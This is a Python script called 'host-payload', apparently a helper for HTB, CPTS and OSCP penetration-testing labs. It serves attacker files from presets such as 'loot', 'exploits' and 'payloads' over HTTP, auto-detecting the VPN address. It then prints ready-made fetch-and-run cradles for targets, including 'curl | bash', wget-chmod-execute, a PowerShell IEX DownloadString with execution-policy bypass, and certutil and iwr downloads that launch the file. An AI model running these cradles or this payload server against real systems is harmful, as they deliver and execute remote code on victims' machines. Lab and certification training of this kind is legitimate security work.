#!/usr/bin/env python3
import argparse
import datetime
import http.server
import os
import re
import shutil
import socket
import socketserver
import subprocess
import sys
import threading
import urllib.parse
from typing import Dict, List, Optional, Tuple


def load_dotenv(path: str = ".env") -> Dict[str, str]:
    data: Dict[str, str] = {}
    if not os.path.isfile(path):
        return data
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for raw in f:
            s = raw.strip()
            if not s or s.startswith("#"):
                continue
            if s.startswith("export "):
                s = s[len("export "):]
            if "=" not in s:
                continue
            k, v = s.split("=", 1)
            data[k.strip()] = v.strip().strip('"').strip("'")
    return data


def run_cmd(cmd: List[str]) -> str:
    try:
        return subprocess.check_output(cmd, stderr=subprocess.DEVNULL, text=True).strip()
    except Exception:
        return ""


def iface_ip(iface: str) -> Optional[str]:
    out = run_cmd(["ip", "-4", "addr", "show", iface])
    m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)/(\d+)", out)
    return m.group(1) if m else None


def detect_ip() -> Optional[str]:
    tun = iface_ip("tun0")
    if tun:
        return tun
    out = run_cmd(["ip", "-4", "-o", "addr", "show", "up"])
    for line in out.splitlines():
        p = line.split()
        if len(p) < 4:
            continue
        iface = p[1]
        ip = p[3].split("/")[0]
        if iface == "lo" or ip.startswith("127."):
            continue
        return ip
    return None


def is_port_free(bind: str, port: int) -> bool:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind((bind, port))
        return True
    except OSError:
        return False
    finally:
        s.close()


def pick_port(bind: str, start: int) -> int:
    for p in range(start, min(start + 200, 65536)):
        if is_port_free(bind, p):
            return p
    raise RuntimeError("No free port found in search window")


def color(text: str, code: str, enable: bool) -> str:
    if not enable:
        return text
    return f"\033[{code}m{text}\033[0m"


def copy_clipboard(text: str) -> Optional[str]:
    for name, cmd in [
        ("xclip", ["xclip", "-selection", "clipboard"]),
        ("xsel", ["xsel", "--clipboard", "--input"]),
        ("wl-copy", ["wl-copy"]),
    ]:
        if shutil.which(name):
            try:
                p = subprocess.Popen(cmd, stdin=subprocess.PIPE)
                p.communicate(input=text.encode())
                if p.returncode == 0:
                    return name
            except Exception:
                pass
    return None


def file_listing(directory: str, filt: str) -> List[str]:
    out: List[str] = []
    for root, _, files in os.walk(directory):
        rel_root = os.path.relpath(root, directory)
        if rel_root != ".":
            root_parts = rel_root.split(os.sep)
            if any(part.startswith(".") for part in root_parts):
                continue
        for f in files:
            if f.startswith("."):
                continue
            full = os.path.join(root, f)
            rel = os.path.relpath(full, directory)
            if filt and filt.lower() not in rel.lower():
                continue
            out.append(rel)
    out.sort()
    return out


def cmd_templates(url: str, filename: str) -> Dict[str, List[str]]:
    quoted = filename.replace('"', '\\"')
    return {
        "linux": [
            f"wget -O {quoted} '{url}'",
            f"curl -fsSL '{url}' -o {quoted}",
            f"curl -fsSL '{url}' | bash",
            f"wget -O /tmp/{quoted} '{url}' && chmod +x /tmp/{quoted} && /tmp/{quoted}",
        ],
        "windows": [
            f"powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('{url}')\"",
            f"powershell -c \"iwr -UseBasicParsing '{url}' -OutFile '{quoted}'\"",
            f"certutil -urlcache -split -f {url} {quoted}",
            f"curl.exe -L '{url}' -o {quoted}",
            f"powershell -c \"iwr -UseBasicParsing '{url}' -OutFile 'C:\\Windows\\Temp\\{quoted}'; Start-Process 'C:\\Windows\\Temp\\{quoted}'\"",
        ],
    }


class PayloadHandler(http.server.SimpleHTTPRequestHandler):
    server_version = "host-payload/1.0"

    def __init__(self, *args, directory: Optional[str] = None, **kwargs):
        self._base_dir = directory
        super().__init__(*args, directory=directory, **kwargs)

    def log_message(self, fmt: str, *args):
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        msg = "%s - - [%s] %s\n" % (self.client_address[0], now, fmt % args)
        if getattr(self.server, "request_log", False):
            sys.stderr.write(msg)

    def do_GET(self):
        super().do_GET()
        if getattr(self.server, "one_shot", False):
            self.server.hit_event.set()


class ThreadingTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="host-payload: temporary payload hosting helper for HTB/CPTS/OSCP workflows")
    p.add_argument("path", nargs="?", default=".", help="Directory to serve or preset name (., loot, exploits, www, payloads)")
    p.add_argument("--port", type=int, default=int(os.getenv("HOST_PAYLOAD_DEFAULT_PORT", "8000")), help="HTTP port")
    p.add_argument("--ip", default="", help="Externally useful host IP for generated URLs")
    p.add_argument("--bind", default="0.0.0.0", help="Bind address (default 0.0.0.0)")
    p.add_argument("--file", default="", help="Specific file for command generation")
    p.add_argument("--list", action="store_true", help="List files available in served directory")
    p.add_argument("--filter", default="", help="Filter files by substring")
    p.add_argument("--auto-port", action="store_true", help="Pick next free port if requested port is busy")
    p.add_argument("--quiet", choices=["url", "command"], help="Quiet output mode")
    p.add_argument("--command", choices=["wget", "curl", "bash-cradle", "chmod-run", "powershell-cradle", "iwr", "certutil", "curl-exe"], help="Output one selected command (requires --file)")
    p.add_argument("--copy", action="store_true", help="Copy URL or selected command to clipboard")
    p.add_argument("--no-color", action="store_true", help="Disable ANSI colors")
    p.add_argument("--log", action="store_true", help="Enable simple request logging with timestamps")
    p.add_argument("--oneshot", action="store_true", help="Exit after first successful GET request")
    return p.parse_args()


def resolve_directory(path_arg: str) -> str:
    presets = {".": ".", "loot": "loot", "exploits": "exploits", "www": "www", "payloads": "payloads"}
    if path_arg in presets:
        return os.path.abspath(presets[path_arg])
    return os.path.abspath(path_arg)


def selected_command(kind: str, url: str, filename: str) -> str:
    m = {
        "wget": f"wget -O {filename} '{url}'",
        "curl": f"curl -fsSL '{url}' -o {filename}",
        "bash-cradle": f"curl -fsSL '{url}' | bash",
        "chmod-run": f"wget -O /tmp/{filename} '{url}' && chmod +x /tmp/{filename} && /tmp/{filename}",
        "powershell-cradle": f"powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('{url}')\"",
        "iwr": f"powershell -c \"iwr -UseBasicParsing '{url}' -OutFile '{filename}'\"",
        "certutil": f"certutil -urlcache -split -f {url} {filename}",
        "curl-exe": f"curl.exe -L '{url}' -o {filename}",
    }
    return m[kind]


def main() -> int:
    env = load_dotenv()
    args = parse_args()
    use_color = sys.stdout.isatty() and not args.no_color and not args.quiet

    if args.port <= 0 or args.port > 65535:
        print("[!] Invalid port (1-65535)", file=sys.stderr)
        return 1

    serve_dir = resolve_directory(args.path)
    if not os.path.isdir(serve_dir):
        print(f"[!] Directory does not exist: {serve_dir}", file=sys.stderr)
        return 1

    lhost = args.ip or env.get("tun0_ip") or detect_ip() or "127.0.0.1"

    files = file_listing(serve_dir, args.filter)

    if args.list:
        for f in files:
            print(f)
        return 0

    chosen = args.file
    if chosen:
        normalized = chosen.lstrip("/")
        if normalized not in files and not os.path.isfile(os.path.join(serve_dir, normalized)):
            print(f"[!] File not found in served directory: {chosen}", file=sys.stderr)
            return 1
        chosen = normalized
    elif files:
        chosen = files[0]

    base_url = f"http://{lhost}:{args.port}"
    file_url = f"{base_url}/{urllib.parse.quote(chosen)}" if chosen else base_url

    if args.command:
        if not chosen:
            print("[!] --command requires --file or at least one file in directory", file=sys.stderr)
            return 1
        cmd = selected_command(args.command, file_url, os.path.basename(chosen))
        if args.copy:
            copy_clipboard(cmd)
        if args.quiet in {"command", "url"}:
            print(cmd if args.quiet == "command" else file_url)
            return 0
        print(cmd)
        return 0

    if args.quiet == "url":
        if args.copy:
            copy_clipboard(file_url)
        print(file_url)
        return 0

    if args.quiet == "command":
        if not chosen:
            print("[!] quiet command mode requires a file", file=sys.stderr)
            return 1
        cmd = selected_command("curl", file_url, os.path.basename(chosen))
        if args.copy:
            copy_clipboard(cmd)
        print(cmd)
        return 0

    if not is_port_free(args.bind, args.port):
        if args.auto_port:
            args.port = pick_port(args.bind, args.port + 1)
        else:
            print(f"[!] Port busy on {args.bind}:{args.port}. Use --auto-port or another --port.", file=sys.stderr)
            return 1

    box = env.get("box", "-")
    target = env.get("target", "-")

    print(color(f"host-payload | box={box} | target={target}", "36", use_color))
    print(color("=" * 48, "36", use_color))
    print(color("[Server]", "32", use_color))
    print(f"Serving directory: {serve_dir}")
    print(f"Bind address: {args.bind}:{args.port}")
    print(f"VPN/External URL: {base_url}")
    print()

    print(color("[Files]", "32", use_color))
    if files:
        preview = files[:12]
        for f in preview:
            print(f"- {f}")
        if len(files) > 12:
            print(f"- ... ({len(files)-12} more)")
    else:
        print("- (no files found)")
    print()

    if chosen:
        print(color("[Payload URL]", "32", use_color))
        print(file_url)
        print()

        cmds = cmd_templates(file_url, os.path.basename(chosen))
        print(color("[Linux Commands]", "32", use_color))
        for c in cmds["linux"]:
            print(c)
        print()

        print(color("[Windows Commands]", "32", use_color))
        for c in cmds["windows"]:
            print(c)
        print()

    if args.copy and chosen:
        tool = copy_clipboard(file_url)
        if tool:
            print(color(f"[+] Copied URL to clipboard via {tool}", "32", use_color))
        else:
            print(color("[!] Clipboard tool not found (xclip/xsel/wl-copy)", "33", use_color))
        print()

    handler = lambda *hargs, **hkwargs: PayloadHandler(*hargs, directory=serve_dir, **hkwargs)
    with ThreadingTCPServer((args.bind, args.port), handler) as httpd:
        httpd.request_log = args.log
        httpd.one_shot = args.oneshot
        httpd.hit_event = threading.Event()

        print(color("[Status]", "32", use_color))
        print("Press Ctrl-C to stop server.")

        if args.oneshot:
            t = threading.Thread(target=httpd.serve_forever, daemon=True)
            t.start()
            httpd.hit_event.wait()
            print("One-shot request received. Shutting down.")
            httpd.shutdown()
            return 0

        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            pass

    return 0


if __name__ == "__main__":
    sys.exit(main())
